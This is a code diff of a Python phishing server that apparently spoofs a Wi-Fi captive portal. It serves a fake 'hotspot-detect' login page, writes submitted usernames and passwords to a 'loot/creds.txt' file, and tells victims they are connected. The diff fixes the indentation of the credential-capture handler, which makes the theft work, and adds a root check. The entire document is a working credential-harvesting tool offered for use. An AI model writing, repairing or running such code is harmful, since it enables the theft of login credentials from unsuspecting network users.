@@ -1,6 +1,13 @@
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import urllib.parse
 import os
+import sys
+
+
+def require_root():
+    if os.geteuid() != 0:
+        print("⚠️ Phish server must be run as root.")
+        sys.exit(1)
 
 LOG_FILE = "loot/creds.txt"
 
@@ -15,26 +22,27 @@ class PhishHandler(SimpleHTTPRequestHandler):
             self.path = "/hotspot-detect.html"
         return SimpleHTTPRequestHandler.do_GET(self)
 
-def do_POST(self):
-    if self.path == "/login":
-        length = int(self.headers.get('Content-Length'))
-        post_data = self.rfile.read(length).decode('utf-8')
-        creds = urllib.parse.parse_qs(post_data)
-        username = creds.get("username", [""])[0]
-        password = creds.get("password", [""])[0]
+    def do_POST(self):
+        if self.path == "/login":
+            length = int(self.headers.get('Content-Length'))
+            post_data = self.rfile.read(length).decode('utf-8')
+            creds = urllib.parse.parse_qs(post_data)
+            username = creds.get("username", [""])[0]
+            password = creds.get("password", [""])[0]
 
-        with open(LOG_FILE, "a") as f:
-            f.write(f"💀 USERNAME: {username} | PASSWORD: {password}\n")
+            with open(LOG_FILE, "a") as f:
+                f.write(f"💀 USERNAME: {username} | PASSWORD: {password}\n")
 
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        self.wfile.write("<h3>✅ Login successful. You are now connected.</h3>".encode())
-    else:
-        self.send_error(404)
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write("<h3>✅ Login successful. You are now connected.</h3>".encode())
+        else:
+            self.send_error(404)
 
 
 if __name__ == "__main__":
+    require_root()
     os.chdir("loot")
     server = HTTPServer(('0.0.0.0', 80), PhishHandler)
     print("🌐 Phishing server running on http://0.0.0.0:80 ...")
